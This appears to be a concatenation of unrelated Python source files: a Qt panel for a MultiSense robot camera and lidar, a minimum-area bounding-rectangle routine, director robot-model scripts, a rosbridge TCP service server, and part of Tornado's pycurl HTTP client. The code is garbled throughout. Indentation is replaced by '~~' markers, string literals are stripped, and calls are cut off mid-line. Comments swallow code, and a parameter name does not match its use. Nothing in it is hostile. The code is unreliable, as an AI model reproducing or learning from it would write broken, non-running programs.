self . widget . headCamFpsSpinner . valueChanged . connect ( self . headCamFpsChange ) \n 
self . widget . headCamGainSpinner . valueChanged . connect ( self . headCamGainChange ) \n 
self . widget . headCamExposureSpinner . valueChanged . connect ( self . headCamExposureChange ) \n 
self . widget . headAutoGainCheck . clicked . connect ( self . headCamAutoGainChange ) \n 
self . widget . ledOnCheck . clicked . connect ( self . ledOnCheckChange ) \n 
self . widget . ledBrightnessSpinner . valueChanged . connect ( self . ledBrightnessChange ) \n 
\n 
self . widget . sendButton . clicked . connect ( self . sendButtonClicked ) \n 
\n 
self . updatePanel ( ) \n 
\n 
\n 
~~ def getCameraFps ( self ) : \n 
~~~ return self . widget . headCamFpsSpinner . value \n 
\n 
~~ def getCameraGain ( self ) : \n 
~~~ return self . widget . headCamGainSpinner . value \n 
\n 
~~ def getCameraExposure ( self ) : \n 
~~~ return self . widget . headCamExposureSpinner . value \n 
\n 
~~ def getCameraLedOn ( self ) : \n 
~~~ return self . widget . ledOnCheck . isChecked ( ) \n 
\n 
~~ def getCameraLedBrightness ( self ) : \n 
~~~ return self . widget . ledBrightnessSpinner . value \n 
\n 
~~ def getCameraAutoGain ( self ) : \n 
~~~ return self . widget . headAutoGainCheck . isChecked ( ) \n 
\n 
~~ def getSpinRate ( self ) : \n 
~~~ return self . widget . spinRateSpinner . value \n 
\n 
~~ def getScanDuration ( self ) : \n 
~~~ return self . widget . scanDurationSpinner . value \n 
\n 
~~ def ledBrightnessChange ( self , event ) : \n 
~~~ self . multisenseChanged = True \n 
\n 
~~ def ledOnCheckChange ( self , event ) : \n 
~~~ self . multisenseChanged = True \n 
\n 
~~ def headCamExposureChange ( self , event ) : \n 
~~~ self . multisenseChanged = True \n 
\n 
~~ def headCamAutoGainChange ( self , event ) : \n 
~~~ self . multisenseChanged = True \n 
self . widget . headCamGainSpinner . setEnabled ( not self . getCameraAutoGain ( ) ) \n 
self . widget . headCamExposureSpinner . setEnabled ( not self . getCameraAutoGain ( ) ) \n 
\n 
~~ def headCamFpsChange ( self , event ) : \n 
~~~ self . multisenseChanged = True \n 
\n 
~~ def headCamGainChange ( self , event ) : \n 
~~~ self . multisenseChanged = True \n 
\n 
~~ def spinRateChange ( self , event ) : \n 
~~~ self . multisenseChanged = True \n 
spinRate = self . getSpinRate ( ) \n 
\n 
if spinRate == 0.0 : \n 
~~~ scanDuration = 240.0 \n 
~~ else : \n 
~~~ scanDuration = abs ( 60.0 / ( spinRate * 2 ) ) \n 
~~ if scanDuration > 240.0 : \n 
~~~ scanDuration = 240.0 \n 
\n 
~~ self . widget . scanDurationSpinner . blockSignals ( True ) \n 
self . widget . scanDurationSpinner . value = scanDuration \n 
self . widget . scanDurationSpinner . blockSignals ( False ) \n 
\n 
~~ def scanDurationChange ( self , event ) : \n 
~~~ self . multisenseChanged = True \n 
scanDuration = self . getScanDuration ( ) \n 
\n 
spinRate = abs ( 60.0 / ( scanDuration * 2 ) ) \n 
\n 
self . widget . spinRateSpinner . blockSignals ( True ) \n 
self . widget . spinRateSpinner . value = spinRate \n 
self . widget . spinRateSpinner . blockSignals ( False ) \n 
\n 
\n 
~~ def sendButtonClicked ( self , event ) : \n 
~~~ self . publishCommand ( ) \n 
\n 
~~ def updatePanel ( self ) : \n 
~~~ if not self . widget . isVisible ( ) : \n 
~~~ return \n 
\n 
~~ ~~ def publishCommand ( self ) : \n 
\n 
~~~ fps = self . getCameraFps ( ) \n 
camGain = self . getCameraGain ( ) \n 
exposure = 1000 * self . getCameraExposure ( ) \n 
ledFlash = self . getCameraLedOn ( ) \n 
ledDuty = self . getCameraLedBrightness ( ) \n 
spinRate = self . getSpinRate ( ) \n 
autoGain = 1 if self . getCameraAutoGain ( ) else 0 \n 
\n 
self . multisenseDriver . sendMultisenseCommand ( fps , camGain , exposure , autoGain , spinRate , ledFlash \n 
self . multisenseChanged = False \n 
self . updateTimer . start ( ) \n 
\n 
\n 
~~ ~~ def _getAction ( ) : \n 
~~~ return app . getToolBarActions ( ) [ ] \n 
\n 
\n 
~~ def init ( driver ) : \n 
\n 
~~~ global panel \n 
global dock \n 
\n 
panel = MultisensePanel ( driver ) \n 
dock = app . addWidgetToDock ( panel . widget , action = _getAction ( ) ) \n 
dock . hide ( ) \n 
\n 
return panel \n 
~~ def deepCopy ( dataOb ) : \n 
~~~ newData = dataObject . NewInstance ( ) \n 
newData . DeepCopy ( dataObj ) \n 
return newData \n 
\n 
~~ def shallowCopy ( dataObj ) : \n 
~~~ newData = dataObj . NewInstance ( ) \n 
newData . ShallowCopy ( dataObj ) \n 
return newData \n 
#!/usr/bin/python \n 
\n 
# Find the minimum-area bounding box of a set of 2D points \n 
# \n 
# The input is a 2D convex hull, in an Nx2 numpy array of x-y co-ordinates.  \n 
# The first and last points points must be the same, making a closed polygon. \n 
# This program finds the rotation angles of each edge of the convex polygon, \n 
# then tests the area of a bounding box aligned with the unique angles in \n 
# 90 degrees of the 1st Quadrant. \n 
# Returns the  \n 
# \n 
# Tested with Python 2.6.5 on Ubuntu 10.04.4 \n 
# Results verified using Matlab \n 
\n 
# Copyright (c) 2013, David Butterworth, University of Queensland \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#     * Redistributions of source code must retain the above copyright \n 
#       notice, this list of conditions and the following disclaimer. \n 
#     * Redistributions in binary form must reproduce the above copyright \n 
#       notice, this list of conditions and the following disclaimer in the \n 
#       documentation and/or other materials provided with the distribution. \n 
#     * Neither the name of the Willow Garage, Inc. nor the names of its \n 
#       contributors may be used to endorse or promote products derived from \n 
#       this software without specific prior written permission. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
\n 
~~ from __future__ import division \n 
from numpy import * \n 
import sys # maxint \n 
\n 
def minBoundingRect ( hull_points_2d ) : \n 
#print "Input convex hull points: " \n 
#print hull_points_2d \n 
\n 
# Compute edges (x2-x1,y2-y1) \n 
~~~ edges = zeros ( ( len ( hull_points_2d ) - 1 , 2 ) ) # empty 2 column array \n 
for i in range ( len ( edges ) ) : \n 
~~~ edge_x = hull_points_2d [ i + 1 , 0 ] - hull_points_2d [ i , 0 ] \n 
edge_y = hull_points_2d [ i + 1 , 1 ] - hull_points_2d [ i , 1 ] \n 
edges [ i ] = [ edge_x , edge_y ] \n 
#print "Edges: \\n", edges \n 
\n 
# Calculate edge angles   atan2(y/x) \n 
~~ edge_angles = zeros ( ( len ( edges ) ) ) # empty 1 column array \n 
for i in range ( len ( edge_angles ) ) : \n 
~~~ edge_angles [ i ] = math . atan2 ( edges [ i , 1 ] , edges [ i , 0 ] ) \n 
#print "Edge angles: \\n", edge_angles \n 
\n 
# Check for angles in 1st quadrant \n 
~~ for i in range ( len ( edge_angles ) ) : \n 
~~~ edge_angles [ i ] = abs ( edge_angles [ i ] % ( math . pi / 2 ) ) # want strictly positive answers \n 
#print "Edge angles in 1st Quadrant: \\n", edge_angles \n 
\n 
# Remove duplicate angles \n 
~~ edge_angles = unique ( edge_angles ) \n 
#print "Unique edge angles: \\n", edge_angles \n 
\n 
# Test each angle to find bounding box with smallest area \n 
min_bbox = ( 0 , sys . maxint , 0 , 0 , 0 , 0 , 0 , 0 ) # rot_angle, area, width, height, min_x, max_x, min_y, max_y #print "Testing", len(edge_angles), "possible rotations for bounding box... \\n" \n 
for i in range ( len ( edge_angles ) ) : \n 
\n 
# Create rotation matrix to shift points to baseline \n 
# R = [ cos(theta)      , cos(theta-PI/2) \n 
#       cos(theta+PI/2) , cos(theta)     ] \n 
~~~ R = array ( [ [ math . cos ( edge_angles [ i ] ) , math . cos ( edge_angles [ i ] - ( math . pi / 2 ) ) ] , [ math . cos ( edge_angles #print "Rotation matrix for ", edge_angles[i], " is \\n", R \n 
\n 
# Apply this rotation to convex hull points \n 
rot_points = dot ( R , transpose ( hull_points_2d ) ) # 2x2 * 2xn \n 
#print "Rotated hull points are \\n", rot_points \n 
\n 
# Find min/max x,y points \n 
min_x = nanmin ( rot_points [ 0 ] , axis = 0 ) \n 
max_x = nanmax ( rot_points [ 0 ] , axis = 0 ) \n 
min_y = nanmin ( rot_points [ 1 ] , axis = 0 ) \n 
max_y = nanmax ( rot_points [ 1 ] , axis = 0 ) \n 
#print "Min x:", min_x, " Max x: ", max_x, "   Min y:", min_y, " Max y: ", max_y \n 
\n 
# Calculate height/width/area of this bounding rectangle \n 
width = max_x - min_x \n 
height = max_y - min_y \n 
area = width * height \n 
#print "Potential bounding box ", i, ":  width: ", width, " height: ", height, "  area: ", area  \n 
# Store the smallest rect found first (a simple convex hull might have 2 answers with same area) if ( area < min_bbox [ 1 ] ) : \n 
~~~ min_bbox = ( edge_angles [ i ] , area , width , height , min_x , max_x , min_y , max_y ) \n 
# Bypass, return the last found rect \n 
#min_bbox = ( edge_angles[i], area, width, height, min_x, max_x, min_y, max_y ) \n 
\n 
# Re-create rotation matrix for smallest rect \n 
~~ ~~ angle = min_bbox [ 0 ] \n 
R = array ( [ [ math . cos ( angle ) , math . cos ( angle - ( math . pi / 2 ) ) ] , [ math . cos ( angle + ( math . pi / 2 ) ) , math #print "Projection matrix: \\n", R \n 
\n 
# Project convex hull points onto rotated frame \n 
proj_points = dot ( R , transpose ( hull_points_2d ) ) # 2x2 * 2xn \n 
#print "Project hull points are \\n", proj_points \n 
\n 
# min/max x,y points are against baseline \n 
min_x = min_bbox [ 4 ] \n 
max_x = min_bbox [ 5 ] \n 
min_y = min_bbox [ 6 ] \n 
max_y = min_bbox [ 7 ] \n 
#print "Min x:", min_x, " Max x: ", max_x, "   Min y:", min_y, " Max y: ", max_y \n 
\n 
# Calculate center point and project onto rotated frame \n 
center_x = ( min_x + max_x ) / 2 \n 
center_y = ( min_y + max_y ) / 2 \n 
center_point = dot ( [ center_x , center_y ] , R ) \n 
#print "Bounding box center point: \\n", center_point \n 
\n 
# Calculate corner points and project onto rotated frame \n 
corner_points = zeros ( ( 4 , 2 ) ) # empty 2 column array \n 
corner_points [ 0 ] = dot ( [ max_x , min_y ] , R ) \n 
corner_points [ 1 ] = dot ( [ min_x , min_y ] , R ) \n 
corner_points [ 2 ] = dot ( [ min_x , max_y ] , R ) \n 
corner_points [ 3 ] = dot ( [ max_x , max_y ] , R ) \n 
#print "Bounding box corner points: \\n", corner_points \n 
\n 
#print "Angle of rotation: ", angle, "rad  ", angle * (180/math.pi), "deg" \n 
\n 
return ( angle , min_bbox [ 1 ] , min_bbox [ 2 ] , min_bbox [ 3 ] , center_point , corner_points ) # rot_angle, area, width, height, center_point, corner_points \n 
~~ from director import atlasdriver \n 
from director import consoleapp \n 
from PythonQt import QtCore , QtGui \n 
from collections import namedtuple \n 
\n 
atlasDriver = atlasdriver . init ( ) \n 
\n 
\n 
w = QtGui . QWidget ( ) \n 
l = QtGui . QVBoxLayout ( w ) \n 
\n 
Button = namedtuple ( , [ , , ] ) ; \n 
buttons = [ \n 
Button ( , atlasDriver . sendRecoveryTriggerOn , None ) \n 
] \n 
\n 
for button in buttons : \n 
~~~ qb = QtGui . QPushButton ( button . name ) \n 
qb . connect ( , button . callback ) \n 
qb . setSizePolicy ( QtGui . QSizePolicy . Expanding , QtGui . QSizePolicy . Expanding ) \n 
\n 
s = qb . styleSheet \n 
s += "font: 36pt;" \n 
if button . color : \n 
~~~ s += "background-color: {:s}; color: white;" . format ( button . color ) \n 
~~ qb . setStyleSheet ( s ) \n 
l . addWidget ( qb ) \n 
\n 
~~ w . setWindowTitle ( ) \n 
w . show ( ) \n 
w . resize ( 500 , 600 ) \n 
\n 
consoleapp . ConsoleApp . start ( ) \n 
from director . consoleapp import ConsoleApp \n 
from director import visualization as vis \n 
from director import roboturdf \n 
from director import jointcontrol \n 
import argparse \n 
\n 
\n 
def getArgs ( ) : \n 
~~~ parser = argparse . ArgumentParser ( ) \n 
parser . add_argument ( , type = str , default = None , help = ) \n 
args , unknown = parser . parse_known_args ( ) \n 
return args \n 
\n 
\n 
~~ app = ConsoleApp ( ) \n 
view = app . createView ( ) \n 
\n 
args = getArgs ( ) \n 
if args . urdf : \n 
\n 
~~~ robotModel = roboturdf . openUrdf ( args . urdf , view ) \n 
\n 
jointNames = robotModel . model . getJointNames ( ) \n 
jointController = jointcontrol . JointController ( [ robotModel ] , jointNames = jointNames ) \n 
\n 
~~ else : \n 
~~~ robotModel , jointController = roboturdf . loadRobotModel ( , view ) \n 
\n 
\n 
\n 
~~ print , robotModel . getProperty ( ) \n 
\n 
for joint in robotModel . model . getJointNames ( ) : \n 
~~~ print , joint \n 
\n 
~~ for link in robotModel . model . getLinkNames ( ) : \n 
~~~ print , link \n 
robotModel . getLinkFrame ( link ) \n 
\n 
\n 
~~ if app . getTestingInteractiveEnabled ( ) : \n 
~~~ view . show ( ) \n 
app . start ( ) \n 
#!/usr/bin/env python \n 
\n 
~~ from distutils . core import setup \n 
from catkin_pkg . python_setup import generate_distutils_setup \n 
\n 
d = generate_distutils_setup ( \n 
packages = [ , , , package_dir = { : } , \n 
) \n 
\n 
setup ( ** d ) \n 
#!/usr/bin/python \n 
import sys \n 
import socket \n 
import time \n 
from random import randint \n 
from rosbridge_library . util import json \n 
\n 
\n 
####################### variables begin ######################################## \n 
# these parameters should be changed to match the actual environment           # \n 
################################################################################ \n 
\n 
tcp_socket_timeout = 10 # seconds \n 
max_msg_length = 20000 # bytes \n 
\n 
rosbridge_ip = "localhost" # hostname or ip \n 
rosbridge_port = 9090 # port as integer \n 
\n 
service_type = "rosbridge_library/TestNestedService" # make sure this matches an existing service type on rosbridge-server (in specified srv_module) service_name = "nested_srv" # service name \n 
\n 
send_fragment_size = 1000 \n 
# delay between sends to rosbridge is not needed anymore, if using my version of protocol (uses buffer to collect data from stream) send_fragment_delay = 0.000 #1 \n 
receive_fragment_size = 10 \n 
receive_message_intervall = 0.0 \n 
\n 
####################### variables end ########################################## \n 
\n 
\n 
####################### service_calculation begin ############################## \n 
# change this function to match whatever service should be provided            # \n 
################################################################################ \n 
\n 
def calculate_service_response ( request ) : \n 
~~~ request_object = json . loads ( request ) # parse string for service request args = request_object [ "args" ] # get parameter field (args) #    count = int(args["count"] )                                                 # get parameter(s) as described in corresponding ROS srv-file # \n 
#    message = ""                                                                # calculate service response #    for i in range(0,count): \n 
#        message += str(chr(randint(32,126))) \n 
#        if i% 100000 == 0: \n 
#            print count - i, "bytes left to generate" \n 
\n 
message = { "data" : { "data" : 42.0 } } \n 
\n 
"""\n    IMPORTANT!\n    use base64 encoding to avoid JSON-parsing problems!\n    --> use .decode("base64","strict") at client side\n    """ \n 
\n 
service_response_data = message # service response (as defined in srv-file) \n 
response_object = { "op" : "service_response" , \n 
"id" : request_object [ "id" ] , \n 
"data" : service_response_data # put service response in "data"-field of response object (in this case it\'s twice "data", because response value is also named data (in srv-file) } \n 
response_message = json . dumps ( response_object ) \n 
return response_message \n 
\n 
####################### service_calculation end ################################ \n 
\n 
\n 
\n 
####################### helper functions / and variables begin ################# \n 
# should not need to be changed (but could be improved )                       # \n 
################################################################################ \n 
\n 
~~ buffer = "" \n 
\n 
def connect_tcp_socket ( ) : \n 
~~~ tcp_sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) # connect to rosbridge tcp_sock . settimeout ( tcp_socket_timeout ) \n 
tcp_sock . connect ( ( rosbridge_ip , rosbridge_port ) ) \n 
return tcp_sock \n 
\n 
~~ def advertise_service ( ) : # advertise service \n 
~~~ advertise_message_object = { "op" : "advertise_service" , \n 
"type" : service_type , \n 
"service" : service_name , \n 
"fragment_size" : receive_fragment_size , \n 
"message_intervall" : receive_message_intervall \n 
} \n 
advertise_message = json . dumps ( advertise_message_object ) \n 
tcp_socket . send ( str ( advertise_message ) ) \n 
\n 
~~ def unadvertise_service ( ) : # unadvertise service ~~~ unadvertise_message_object = { "op" : "unadvertise_service" , \n 
"service" : service_name \n 
} \n 
unadvertise_message = json . dumps ( unadvertise_message_object ) \n 
tcp_socket . send ( str ( unadvertise_message ) ) \n 
\n 
~~ def wait_for_service_request ( ) : # receive data from rosbridge ~~~ data = None \n 
global buffer \n 
\n 
try : \n 
~~~ done = False \n 
global buffer \n 
while not done : \n 
~~~ incoming = tcp_socket . recv ( max_msg_length ) # get data from socket if incoming == : \n 
~~~ print "connection closed by peer" \n 
sys . exit ( 1 ) \n 
~~ buffer = buffer + incoming # append data to buffer try : # try to parse JSON from buffer ~~~ data_object = json . loads ( buffer ) \n 
if data_object [ "op" ] == "call_service" : \n 
~~~ data = buffer \n 
done = True \n 
return data # if parsing was successful --> return data string ~~ ~~ except Exception , e : \n 
#print "direct_access error:" \n 
#print e \n 
~~~ pass \n 
\n 
#print "trying to defragment" \n 
~~ try : # opcode was not "call_service" -> try to defragment ~~~ result_string = buffer . split ( "}{" ) # split buffer into fragments and re-fill with curly brackets result = [ ] \n 
for fragment in result_string : \n 
~~~ if fragment [ 0 ] != "{" : \n 
~~~ fragment = "{" + fragment \n 
~~ if fragment [ len ( fragment ) - 1 ] != "}" : \n 
~~~ fragment = fragment + "}" \n 
~~ result . append ( json . loads ( fragment ) ) \n 
\n 
~~ try : # try to defragment when received all fragments ~~~ fragment_count = len ( result ) \n 
announced = int ( result [ 0 ] [ "total" ] ) \n 
\n 
if fragment_count == announced : \n 
~~~ reconstructed = "" \n 
sorted_result = [ None ] * fragment_count # sort fragments.. \n 
unsorted_result = [ ] \n 
for fragment in result : \n 
~~~ unsorted_result . append ( fragment ) \n 
sorted_result [ int ( fragment [ "num" ] ) ] = fragment \n 
\n 
~~ for fragment in sorted_result : # reconstruct from fragments ~~~ reconstructed = reconstructed + fragment [ "data" ] \n 
\n 
#print "reconstructed", reconstructed \n 
~~ buffer = "" # empty buffer \n 
done = True \n 
print "reconstructed message from" , len ( result ) , "fragments" \n 
#print reconstructed \n 
return reconstructed \n 
~~ ~~ except Exception , e : \n 
~~~ print "not possible to defragment:" , buffer \n 
print e \n 
~~ ~~ except Exception , e : \n 
~~~ print "defrag_error:" , buffer \n 
print e \n 
pass \n 
~~ ~~ ~~ except Exception , e : \n 
#print "network-error(?):", e \n 
~~~ pass \n 
~~ return data \n 
\n 
~~ def send_service_response ( response ) : # send response to rosbridge ~~~ tcp_socket . send ( response ) \n 
\n 
~~ def list_of_fragments ( full_message , fragment_size ) : # create fragment messages for a huge message ~~~ message_id = randint ( 0 , 64000 ) # generate random message id fragments = [ ] # generate list of data fragments cursor = 0 \n 
while cursor < len ( full_message ) : \n 
~~~ fragment_begin = cursor \n 
if len ( full_message ) < cursor + fragment_size : \n 
~~~ fragment_end = len ( full_message ) \n 
cursor = len ( full_message ) \n 
~~ else : \n 
~~~ fragment_end = cursor + fragment_size \n 
cursor += fragment_size \n 
~~ fragment = full_message [ fragment_begin : fragment_end ] \n 
fragments . append ( fragment ) \n 
\n 
~~ fragmented_messages_list = [ ] # generate list of fragmented messages (including headers) if len ( fragments ) > 1 : \n 
~~~ for count , fragment in enumerate ( fragments ) : # iterate through list and have index counter ~~~ fragmented_message_object = { "op" : "fragment" , #   create python-object for each fragment message "id" : str ( message_id ) , \n 
"data" : str ( fragment ) , \n 
"num" : count , \n 
"total" : len ( fragments ) \n 
} \n 
fragmented_message = json . dumps ( fragmented_message_object ) # create JSON-object from python-object for each fragment message fragmented_messages_list . append ( fragmented_message ) # append JSON-object to list of fragmented messages ~~ ~~ else : # if only 1 fragment --> do not send as fragment, but as service_response ~~~ fragmented_messages_list . append ( str ( fragment ) ) \n 
~~ return fragmented_messages_list \n 
####################### helper functions end ################################### \n 
\n 
\n 
####################### script begin ########################################### \n 
# should not need to be changed (but could be improved )                       # \n 
################################################################################ \n 
\n 
~~ tcp_socket = connect_tcp_socket ( ) # open tcp_socket \n 
advertise_service ( ) # advertise service in ROS (via rosbridge) print "service provider started and waiting for requests" \n 
\n 
try : # allows to catch KeyboardInterrupt ~~~ while True : # loop forever (or until ctrl-c is pressed) ~~~ data = None \n 
try : # allows to catch any Exception (network, json, ..) ~~~ data = wait_for_service_request ( ) # receive request from rosbridge if data == : # exit on empty string ~~~ break \n 
~~ elif data != None and len ( data ) > 0 : # received service_request (or at least some data..) ~~~ response = calculate_service_response ( data ) # generate service_response \n 
print "response calculated, now splitting into fragments.." \n 
fragment_list = list_of_fragments ( response , send_fragment_size ) # generate fragments to send to rosbridge \n 
print "sending" , len ( fragment_list ) , "messages as response" \n 
for fragment in fragment_list : \n 
#print "sending:" ,fragment \n 
~~~ send_service_response ( fragment ) # send service_response to rosbridge (or fragments; just send any list entry) time . sleep ( send_fragment_delay ) # (not needed if using patched rosbridge protocol.py) ~~ ~~ ~~ except Exception , e : \n 
~~~ print e \n 
pass \n 
~~ ~~ ~~ except KeyboardInterrupt : \n 
~~~ try : \n 
~~~ unadvertise_service ( ) # unadvertise service tcp_socket . close ( ) # close tcp_socket \n 
~~ except Exception , e : \n 
~~~ print e \n 
~~ print "non-ros_service_server stopped because user pressed \\"Ctrl-C\\"" \n 
#!/usr/bin/env python \n 
# \n 
# Copyright 2009 Facebook \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
# not use this file except in compliance with the License. You may obtain \n 
# a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
# License for the specific language governing permissions and limitations \n 
# under the License. \n 
\n 
~~ """Non-blocking HTTP client implementation using pycurl.""" \n 
\n 
from __future__ import absolute_import , division , print_function , with_statement \n 
\n 
import collections \n 
import logging \n 
import pycurl \n 
import threading \n 
import time \n 
\n 
from tornado import httputil \n 
from tornado import ioloop \n 
from tornado . log import gen_log \n 
from tornado import stack_context \n 
\n 
from tornado . escape import utf8 , native_str \n 
from tornado . httpclient import HTTPResponse , HTTPError , AsyncHTTPClient , main \n 
from tornado . util import bytes_type \n 
\n 
try : \n 
~~~ from io import BytesIO # py3 \n 
~~ except ImportError : \n 
~~~ from cStringIO import StringIO as BytesIO # py2 \n 
\n 
\n 
~~ class CurlAsyncHTTPClient ( AsyncHTTPClient ) : \n 
~~~ def initialize ( self , io_loop , max_clients = 10 , defaults = None ) : \n 
~~~ super ( CurlAsyncHTTPClient , self ) . initialize ( io_loop , defaults = defaults ) \n 
self . _multi = pycurl . CurlMulti ( ) \n 
self . _multi . setopt ( pycurl . M_TIMERFUNCTION , self . _set_timeout ) \n 
self . _multi . setopt ( pycurl . M_SOCKETFUNCTION , self . _handle_socket ) \n 
self . _curls = [ _curl_create ( ) for i in range ( max_clients ) ] \n 
self . _free_list = self . _curls [ : ] \n 
self . _requests = collections . deque ( ) \n 
self . _fds = { } \n 
self . _timeout = None \n 
\n 
# libcurl has bugs that sometimes cause it to not report all \n 
# relevant file descriptors and timeouts to TIMERFUNCTION/ \n 
# SOCKETFUNCTION.  Mitigate the effects of such bugs by \n 
# forcing a periodic scan of all active requests. \n 
self . _force_timeout_callback = ioloop . PeriodicCallback ( \n 
self . _handle_force_timeout , 1000 , io_loop = io_loop ) \n 
self . _force_timeout_callback . start ( ) \n 
\n 
# Work around a bug in libcurl 7.29.0: Some fields in the curl \n 
# multi object are initialized lazily, and its destructor will \n 
# segfault if it is destroyed without having been used.  Add \n 
# and remove a dummy handle to make sure everything is \n 
# initialized. \n 
dummy_curl_handle = pycurl . Curl ( ) \n 
self . _multi . add_handle ( dummy_curl_handle ) \n 
self . _multi . remove_handle ( dummy_curl_handle ) \n 
\n 
~~ def close ( self ) : \n 
~~~ self . _force_timeout_callback . stop ( ) \n 
if self . _timeout is not None : \n 
~~~ self . io_loop . remove_timeout ( self . _timeout ) \n 
~~ for curl in self . _curls : \n 
~~~ curl . close ( ) \n 
~~ self . _multi . close ( ) \n 
super ( CurlAsyncHTTPClient , self ) . close ( ) \n 
\n 
~~ def fetch_impl ( self , request , callback ) : \n 
~~~ self . _requests . append ( ( request , callback ) ) \n 
self . _process_queue ( ) \n 
self . _set_timeout ( 0 ) \n 
\n 
~~ def _handle_socket ( self , event , fd , multi , data ) : \n 
~~~ """Called by libcurl when it wants to change the file descriptors\n        it cares about.\n        """ \n 
event_map = { \n 
pycurl . POLL_NONE : ioloop . IOLoop . NONE , \n 
pycurl . POLL_IN : ioloop . IOLoop . READ , \n 
pycurl . POLL_OUT : ioloop . IOLoop . WRITE , \n 
pycurl . POLL_INOUT : ioloop . IOLoop . READ | ioloop . IOLoop . WRITE \n 
} \n 
if event == pycurl . POLL_REMOVE : \n 
~~~ if fd in self . _fds : \n 
~~~ self . io_loop . remove_handler ( fd ) \n 
del self . _fds [ fd ] \n 
~~ ~~ else : \n 
~~~ ioloop_event = event_map [ event ] \n 
# libcurl sometimes closes a socket and then opens a new \n 
# one using the same FD without giving us a POLL_NONE in \n 
# between.  This is a problem with the epoll IOLoop, \n 
# because the kernel can tell when a socket is closed and \n 
# removes it from the epoll automatically, causing future \n 
\n 
# this has happened, always use remove and re-add \n 
# instead of update. \n 
if fd in self . _fds : \n 
~~~ self . io_loop . remove_handler ( fd ) \n 
~~ self . io_loop . add_handler ( fd , self . _handle_events , \n 
ioloop_event ) \n 
self . _fds [ fd ] = ioloop_event \n 
\n 
~~ ~~ def _set_timeout ( self , msecs ) : \n 
~~~ """Called by libcurl to schedule a timeout.""" \n 
if self . _timeout is not None : \n 
~~~ self . io_loop . remove_timeout ( self . _timeout ) \n 
~~ self . _timeout = self . io_loop . add_timeout ( \n 
self . io_loop . time ( ) + msecs / 1000.0 , self . _handle_timeout ) \n 
\n 
~~ def _handle_events ( self , fd , events ) : \n 
~~~ """Called by IOLoop when there is activity on one of our\n        file descriptors.\n        """ \n 
action = 0 \n 
if events & ioloop . IOLoop . READ : \n 
~~~ action |= pycurl . CSELECT_IN \n 
~~ if events & ioloop . IOLoop . WRITE : \n 
~~~ action |= pycurl . CSELECT_OUT \n 
~~ while True : \n 
~~~ try : \n 
~~~ ret , num_handles = self . _multi . socket_action ( fd , action ) \n 
~~ except pycurl . error as e : \n 
~~~ ret = e . args [ 0 ] \n 
~~ if ret != pycurl . E_CALL_MULTI_PERFORM : \n 
~~~ break \n 
~~ ~~ self . _finish_pending_requests ( ) \n 
\n 
~~ def _handle_timeout ( self ) : \n 
~~~ """Called by IOLoop when the requested timeout has passed.""" \n 
with stack_context . NullContext ( ) : \n 
~~~ self . _timeout = None \n 
while True : \n 
~~~ try : \n 
~~~ ret , num_handles = self . _multi . socket_action ( \n 
pycurl . SOCKET_TIMEOUT , 0 ) \n 
~~ except pycurl . error as e : \n 
~~~ ret = e . args [ 0 ] \n 
~~ if ret != pycurl . E_CALL_MULTI_PERFORM : \n 
~~~ break \n 
~~ ~~ self . _finish_pending_requests ( ) \n 
\n 
\n 
# call _set_timeout whenever the timeout changes.  However, \n 
# sometimes after _handle_timeout we will need to reschedule \n 
\n 
# perspective.  This is because when socket_action is \n 
# called with SOCKET_TIMEOUT, libcurl decides internally which \n 
# timeouts need to be processed by using a monotonic clock \n 
\n 
# to decide when timeouts have occurred.  When those clocks \n 
# disagree on elapsed time (as they will whenever there is an \n 
# NTP adjustment), tornado might call _handle_timeout before \n 
# libcurl is ready.  After each timeout, resync the scheduled \n 
\n 
~~ new_timeout = self . _multi . timeout ( ) \n 
if new_timeout >= 0 : \n 
~~~ self . _set_timeout ( new_timeout ) \n 
\n 
~~ ~~ def _handle_force_timeout ( self ) : \n 
~~~ """Called by IOLoop periodically to ask libcurl to process any\n        events it may have forgotten about.\n        """ \n 
with stack_context . NullContext ( ) : \n 
~~~ while True : \n 
~~~ try : \n 
~~~ ret , num_handles = self . _multi . socket_all ( ) \n 
~~ except pycurl . error as e : \n 
~~~ ret = e . args [ 0 ] \n 
~~ if ret != pycurl . E_CALL_MULTI_PERFORM : \n 
~~~ break \n 
~~ ~~ self . _finish_pending_requests ( ) \n 
\n 
~~ ~~ def _finish_pending_requests ( self ) : \n 
~~~ """Process any requests that were completed by the last\n        call to multi.socket_action.\n        """ \n 
while True : \n 
~~~ num_q , ok_list , err_list = self . _multi . info_read ( ) \n 
for curl in ok_list : \n 
~~~ self . _finish ( curl ) \n 
~~ for curl , errnum , errmsg in err_list : \n 
~~~ self . _finish ( curl , errnum , errmsg ) \n 
~~ if num_q == 0 : \n 
~~~ break \n 
~~ ~~ self . _process_queue ( ) \n 
\n 
~~ def _process_queue ( self ) : \n 
~~~ with stack_context . NullContext ( ) : \n 
~~~ while True : \n 
~~~ started = 0 \n 
while self . _free_list and self . _requests : \n 
~~~ started += 1 \n 
curl = self . _free_list . pop ( ) \n 
